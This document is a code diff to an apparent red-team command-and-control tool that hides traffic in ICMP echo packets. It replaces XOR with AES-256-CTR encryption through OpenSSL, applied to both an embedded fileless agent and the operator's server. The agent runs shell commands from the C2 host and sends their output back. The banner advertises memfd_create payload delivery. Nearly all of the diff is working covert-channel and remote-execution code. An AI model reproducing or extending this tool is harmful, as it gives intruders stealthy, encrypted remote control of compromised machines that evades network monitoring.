@@ -106,13 +106,16 @@ import base64
 import argparse
 import select
 import urllib.parse
+import hashlib
+import ctypes
+import ctypes.util
 
 # ═══════════════════════════════════════════════════════════════
 #  Protocol Constants
 # ═══════════════════════════════════════════════════════════════
 ICMP_ID       = 0x1337       # 16-bit identifier in ICMP header — our "magic"
 MAGIC         = 0xDE         # first byte of payload — quick filter
-XOR_KEY       = b"r3dt34m!@#2024xK"   # 16-byte symmetric key
+SHARED_SECRET = b"r3dt34m!@#2024xK"   # shared secret for key derivation
 
 MSG_HEARTBEAT = 0x01         # agent → C2: "I'm alive"
 MSG_COMMAND   = 0x02         # C2 → agent: "run this shell command"
@@ -133,25 +136,51 @@ MSG_RESULT    = 0x03         # agent → C2: chunked command output
 #    5. On '__exit__' command, closes socket and terminates
 # ═══════════════════════════════════════════════════════════════
 AGENT_CODE = r'''#!/usr/bin/env python3
-"""ICMP C2 Agent — fileless, memory-resident, XOR-encrypted"""
+"""ICMP C2 Agent — fileless, memory-resident, AES-256-CTR encrypted"""
 import socket, struct, os, subprocess, time, random, sys
+import ctypes, ctypes.util, hashlib
 
 C2 = "__C2_IP__"
-K  = b"r3dt34m!@#2024xK"
+SS = b"r3dt34m!@#2024xK"
 ID = 0x1337
 MG = 0xDE
 HB_INTERVAL = 30
 
-# ── XOR stream cipher ───────────────────────────────────────
-# Each byte of data is XORed with the corresponding key byte
-# (cycling the key).  Same function encrypts and decrypts.
-def xor(d, k):
-    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))
+# ── AES-256-CTR via OpenSSL libcrypto ────────────────────────
+# Uses ctypes to call the system's OpenSSL library directly.
+# No pip packages needed — only stdlib + system libcrypto.
+_lc = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
+_lc.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
+_lc.EVP_CIPHER_CTX_new.argtypes = []
+_lc.EVP_aes_256_ctr.restype = ctypes.c_void_p
+_lc.EVP_aes_256_ctr.argtypes = []
+_lc.EVP_EncryptInit_ex.restype = ctypes.c_int
+_lc.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_char_p,ctypes.c_char_p]
+_lc.EVP_EncryptUpdate.restype = ctypes.c_int
+_lc.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p,ctypes.c_char_p,ctypes.POINTER(ctypes.c_int),ctypes.c_char_p,ctypes.c_int]
+_lc.EVP_CIPHER_CTX_free.restype = None
+_lc.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
+AK = hashlib.sha256(SS).digest()
+
+def _ac(d, iv):
+    ctx = _lc.EVP_CIPHER_CTX_new()
+    _lc.EVP_EncryptInit_ex(ctx, _lc.EVP_aes_256_ctr(), None, AK, iv)
+    o = ctypes.create_string_buffer(len(d)+32)
+    n = ctypes.c_int(0)
+    _lc.EVP_EncryptUpdate(ctx, o, ctypes.byref(n), d, len(d))
+    r = o.raw[:n.value]
+    _lc.EVP_CIPHER_CTX_free(ctx)
+    return r
+
+def enc(d):
+    iv = os.urandom(16)
+    return iv + _ac(d, iv)
+
+def dec(d):
+    if len(d) < 16: return b''
+    return _ac(d[16:], d[:16])
 
 # ── ICMP checksum (RFC 1071) ────────────────────────────────
-# The Internet checksum is the 16-bit ones' complement of the
-# ones' complement sum of all 16-bit words in the header+data.
-# Required by the kernel to accept outgoing ICMP packets.
 def ck(p):
     if len(p) % 2:
         p += b'\x00'
@@ -160,27 +189,16 @@ def ck(p):
     s += s >> 16
     return (~s) & 0xffff
 
-# ── Transmit: build ICMP echo request with encrypted payload ─
-# Packet layout: [type=8][code=0][checksum][ID=0x1337][seq]
-#                [MAGIC][msg_type][XOR-encrypted data]
-# We compute checksum with the checksum field zeroed, then
-# rebuild the header with the real checksum (standard procedure).
+# ── Transmit: ICMP echo request with AES-encrypted payload ──
+# Payload: [MAGIC][msg_type][IV(16)][AES-CTR ciphertext]
 def tx(sk, mt, pl, sq):
-    bd = bytes([MG, mt]) + xor(pl, K)
+    bd = bytes([MG, mt]) + enc(pl)
     h = struct.pack('!BBHHH', 8, 0, 0, ID, sq)
     r = h + bd
     cs = ck(r)
     sk.sendto(struct.pack('!BBHHH', 8, 0, cs, ID, sq) + bd, (C2, 0))
 
 # ── Receive: filter for our ICMP echo requests ──────────────
-# Raw ICMP socket receives ALL incoming ICMP packets.
-# We must filter:
-#   - Skip IP header (first 20 bytes)
-#   - Check ICMP type == 8 (echo request, not reply)
-#   - Check ICMP ID == 0x1337 (our identifier)
-#   - Check MAGIC byte in payload
-# The kernel also sends auto-replies (type 0) to incoming
-# echo requests — we ignore those.
 def rx(sk, to=5):
     sk.settimeout(to)
     end = time.time() + to
@@ -189,14 +207,14 @@ def rx(sk, to=5):
             d, a = sk.recvfrom(65535)
             if len(d) < 30:
                 continue
-            ic = d[20:]         # skip 20-byte IP header
+            ic = d[20:]
             t, _, _, pi, sq = struct.unpack('!BBHHH', ic[:8])
             if pi != ID or t != 8:
-                continue        # not our packet
-            pl = ic[8:]         # payload after ICMP header
-            if len(pl) < 2 or pl[0] != MG:
-                continue        # no magic byte
-            return pl[1], sq, xor(pl[2:], K)
+                continue
+            pl = ic[8:]
+            if len(pl) < 18 or pl[0] != MG:
+                continue
+            return pl[1], sq, dec(pl[2:])
         except socket.timeout:
             break
         except Exception:
@@ -263,9 +281,62 @@ if __name__ == '__main__':
 #  Crypto & ICMP Helpers
 # ═══════════════════════════════════════════════════════════════
 
-def xor_crypt(data: bytes, key: bytes) -> bytes:
-    """XOR stream cipher — same function encrypts and decrypts."""
-    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+# ═══════════════════════════════════════════════════════════════
+#  AES-256-CTR Crypto via ctypes + OpenSSL
+#
+#  Uses the system's libcrypto (OpenSSL) for AES-256-CTR encryption.
+#  No pip dependencies required — ctypes calls the shared library directly.
+#
+#  Key derivation: AES_KEY = SHA-256(SHARED_SECRET) → 32 bytes
+#  Per-packet random IV prevents identical plaintext → identical ciphertext.
+#  CTR mode: encrypt and decrypt are the same operation.
+# ═══════════════════════════════════════════════════════════════
+
+_libcrypto = ctypes.CDLL(ctypes.util.find_library('crypto') or 'libcrypto.so')
+_libcrypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
+_libcrypto.EVP_CIPHER_CTX_new.argtypes = []
+_libcrypto.EVP_aes_256_ctr.restype = ctypes.c_void_p
+_libcrypto.EVP_aes_256_ctr.argtypes = []
+_libcrypto.EVP_EncryptInit_ex.restype = ctypes.c_int
+_libcrypto.EVP_EncryptInit_ex.argtypes = [
+    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+    ctypes.c_char_p, ctypes.c_char_p]
+_libcrypto.EVP_EncryptUpdate.restype = ctypes.c_int
+_libcrypto.EVP_EncryptUpdate.argtypes = [
+    ctypes.c_void_p, ctypes.c_char_p,
+    ctypes.POINTER(ctypes.c_int), ctypes.c_char_p, ctypes.c_int]
+_libcrypto.EVP_CIPHER_CTX_free.restype = None
+_libcrypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
+
+AES_KEY = hashlib.sha256(SHARED_SECRET).digest()  # 32 bytes for AES-256
+
+
+def aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
+    """AES-256-CTR encrypt/decrypt via OpenSSL libcrypto.
+    CTR mode is symmetric — same function encrypts and decrypts."""
+    ctx = _libcrypto.EVP_CIPHER_CTX_new()
+    _libcrypto.EVP_EncryptInit_ex(
+        ctx, _libcrypto.EVP_aes_256_ctr(), None, key, iv)
+    out = ctypes.create_string_buffer(len(data) + 32)
+    out_len = ctypes.c_int(0)
+    _libcrypto.EVP_EncryptUpdate(
+        ctx, out, ctypes.byref(out_len), data, len(data))
+    result = out.raw[:out_len.value]
+    _libcrypto.EVP_CIPHER_CTX_free(ctx)
+    return result
+
+
+def aes_encrypt(plaintext: bytes) -> bytes:
+    """Encrypt with random IV. Returns: IV (16 bytes) + ciphertext."""
+    iv = os.urandom(16)
+    return iv + aes_ctr(plaintext, AES_KEY, iv)
+
+
+def aes_decrypt(data: bytes) -> bytes:
+    """Decrypt: first 16 bytes = IV, rest = ciphertext."""
+    if len(data) < 16:
+        return b''
+    return aes_ctr(data[16:], AES_KEY, data[:16])
 
 
 def icmp_checksum(packet: bytes) -> int:
@@ -301,7 +372,7 @@ def build_icmp_packet(msg_type: int, payload: bytes, seq: int) -> bytes:
     The checksum must be computed with the checksum field set to zero,
     then patched back into the header.  This is the standard ICMP procedure.
     """
-    body = bytes([MAGIC, msg_type]) + xor_crypt(payload, XOR_KEY)
+    body = bytes([MAGIC, msg_type]) + aes_encrypt(payload)
     header = struct.pack('!BBHHH', 8, 0, 0, ICMP_ID, seq)
     raw = header + body
     cs = icmp_checksum(raw)
@@ -473,11 +544,11 @@ class C2Server:
                     continue
 
                 payload = icmp_data[8:]
-                if len(payload) < 2 or payload[0] != MAGIC:
-                    continue
+                if len(payload) < 18 or payload[0] != MAGIC:
+                    continue    # 1 magic + 1 type + 16 IV minimum
 
                 msg_type = payload[1]
-                dec = xor_crypt(payload[2:], XOR_KEY)
+                dec = aes_decrypt(payload[2:])
 
                 if msg_type == MSG_HEARTBEAT:
                     self.agent_info = dec.decode('utf-8', errors='replace')
@@ -522,15 +593,15 @@ class C2Server:
 
         print("\033[91m")
         print("+" + "=" * 52 + "+")
-        print("|     Red Team  Fileless ICMP C2  v1.0             |")
-        print("|     XOR-Encrypted Covert Channel                 |")
+        print("|     Red Team  Fileless ICMP C2  v2.0             |")
+        print("|     AES-256-CTR Encrypted Covert Channel          |")
         print("|     memfd_create Payload Delivery                |")
         print("+" + "=" * 52 + "+")
         print("\033[0m")
         print(f"  Target : {self.target_ip}")
         print(f"  C2 IP  : {self.listen_ip}")
         print(f"  Proto  : ICMP echo-request | ID 0x{ICMP_ID:04X}")
-        print(f"  Crypto : XOR key len={len(XOR_KEY)}")
+        print(f"  Crypto : AES-256-CTR + random IV (OpenSSL)")
         print()
         print("  Commands:")
         print("    <cmd>      Execute shell command on target")
